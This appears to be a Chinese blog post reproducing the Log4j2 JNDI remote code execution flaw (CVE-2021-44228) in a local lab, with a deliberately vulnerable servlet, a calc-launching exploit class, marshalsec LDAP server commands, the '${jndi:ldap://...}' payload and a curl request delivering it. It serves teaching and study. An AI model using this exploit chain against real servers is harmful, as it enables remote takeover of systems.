---
title: Log4j2 RCE漏洞复现
date: 2022-12-20 20:53:14
tags: 
- java
- RCE
---

## 0x00 引言

Log4j2 RCE恐怕是近几年最严重也影响最广的漏洞，log4j2作为最流行的Java开源日志框架之一，应用极广，而该RCE又非常容易被利用，因此非常危险。去年这个时候拜他所赐相当热闹，实际上复现不算困难，本文从头开始在本地搭建Java Web环境并复现log4j2 RCE漏洞。另外先提醒，复现中搭环境最重要也最麻烦的是JRE版本必须仔细选择，不然会出很多麻烦。

### 1. 漏洞描述

Log4j(log for Java)是最常用的两个Java日志管理开源框架之一，由Apache维护。由于 Apache Log4j2 某些功能存在**递归解析**功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。

实际受影响范围如下：Apache Log4j 2.x < 2.15.0-rc2

[CVE官方描述](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228 )：

> Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

### 2. 复现基本流程

Log4j2 RCE复现首先需要有使用了该日志框架的Web服务，再构造LDAP服务，该LDAP服务会返回一个恶意类，然后发请求传参给Web服务报错调用logger中的方法触发递归解析完成攻击。

![img](https://files.catbox.moe/ompren.png)

## 0x01 相关技术栈

### 1. **Java Web**

Java是Web开发效率最高的语言，Java开发的Web应用通常用Tomcat作Web容器。本文复现环境所需的Web服务比较简单，因此不需要SpringBoot之类的框架，写一个接收GET或者POST请求的Servlet即可。在搭建服务时本地IDE使用了IntelliJ IDEA 2022.1，但虚拟机用IDEA运行速度不尽人意，因此改用开源简洁的Eclipse 2022-09，Eclipse配置Maven，Tomcat等环境与idea相差较多，搭建Java web环境花了一点功夫。

### 2. **Log4J2**

Log4J2是最流行的Java开源日志框架之一，可以输出变量到日志，其中lookups接口允许解析多种协议的信息。

对[Lookups的官网描述](https://logging.apache.org/log4j/2.x/manual/lookups.html)：

> Lookups provide a way to add values to the Log4j configuration at arbitrary places. They are a particular type of Plugin that implements the StrLookup interface. Information on how to use Lookups in configuration files can be found in the Property Substitution section of the Configuration page.

其中允许解析的JNDI协议出现了本次漏洞。

### 3. **JNDI**

JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。

实际上就是一种索引系统，允许通过名称得到对象，而JNDI也是上层的封装，支持许多数据源协议，其他包括LDAP：

![image-20221220235643984](https://files.catbox.moe/hvx314.png)

### 4. LDAP

LDAP即Lightweight Directory Access Protocol（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，如同Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。

实际上LADP也是一种目录访问协议，但比JNDI更底层，可以构建LADP协议的类文件服务器。

## 0x02 漏洞原理

如前所述，Log4j2支持对JNDI协议下LADP数据源的解析，因此如果构造对JNDI的注入攻击，就会将攻击内容解析出来，但只是这样并没有回显，也不容易完成完整的攻击。

实际上，JNDI协议还支持Naming References，即远程下载class文件并加载构建对象，而如果构造的JNDI注入是远程服务器上的恶意类文件，就能实现RCE与反弹Shell。具体实现如下图所示：

![image-20221220235813017](https://files.catbox.moe/bonpia.png)

## 0x03 **具体复现过程**

### 1. **搭建Java Web服务**

使用Eclipse + Tomcat搭建Java web服务，因为jre1.8.0_191以上的JRE版本禁止了远程加载类并调用，因此只能用191之前的版本搭建服务，并且**恶意类编译的javac也必须与web服务的JDK版本对应**，否则会无法运行。本次复现使用的JRE版本是1.8.0_181

Eclipse运行tomcat需要配置对应版本的插件，而且不同版本的插件需要update。

具体Servlet编写：

```java
package com.hit;

import java.io.*;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;



@WebServlet("/Log4j2Servlet")
public class Log4j2Servlet extends HttpServlet {
    private static final long serialVersionUID = 1L;
    private static final Logger logger = LogManager.getLogger(Log4j2Servlet.class);
    /**
     * @see HttpServlet#HttpServlet()
     */
    public Log4j2Servlet() {
        super();
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        // TODO Auto-generated constructor stub
    }

    /**
     * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
     */
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        // TODO Auto-generated method stub
        response.setContentType("text/html");
        response.setHeader("Content-Type", "text/html; charset=utf-8");
        System.out.println(request.getQueryString());


        // Hello
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<h1>Hello World!</h1>");
        out.println("</body></html>");
    }

    /**
     * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
     */
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        // TODO Auto-generated method stub
        String name = request.getParameter("username");
        System.out.println(name);
        logger.error(name);
        response.setContentType("text/html");
        response.setHeader("Content-Type", "text/html; charset=utf-8");
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<h1>Got it!</h1>");
        out.println("</body></html>");
    }
}

```



### 2. **编写恶意类并编译**

```java
public class Exploit {
    public Exploit(){
        try{
            String[] commands = {"calc.exe"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
        } catch(Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] argv) {
        Exploit e = new Exploit();
    }
}

```

打印一段话并弹出系统计算器。

之后用javac在当前目录编译生成.class文件。

注意：Javac的jre版本也要与JavaWeb环境对应，否则无法运行。

### 3. **搭建JNDI+LADP服务**

搭建JNDI服务首先要有简单的文件管理服务可供下载，用python内置的简单http服务器在8080端口搭一个：

```shell
python3 -m http.server 8080
```

 搭建JNDI用GitHub上开源的JNDI服务**marshalsec**即可，git clone拉取源码，根据[README操作](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf)：

```shell
mvn clean package -DskipTests
```

在生成的target目录：

```shell
Java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/#Exploit
```

注意：后面的本地IP 127.0.0.1若在虚拟机中会与宿主机冲突，需要用http://localhost:8080。

对于以上环境，完成RCE的payload为（1389为**marshalsec**默认端口）:

`${jndi:ldap://127.0.0.1:1389/Exploit}`

最后用hackerBar或者postman等工具发起http请求即可。

我懒得再用工具，直接在命令行用curl：
```bash
curl -X POST http://localhost/Log4j2Servlet -d 'username=${jndi:ldap://127.0.0.1:1389/Exploit}'
```
效果如下：

![image-20221221000613839](https://i.328888.xyz/2022/12/25/DxJyv.png)
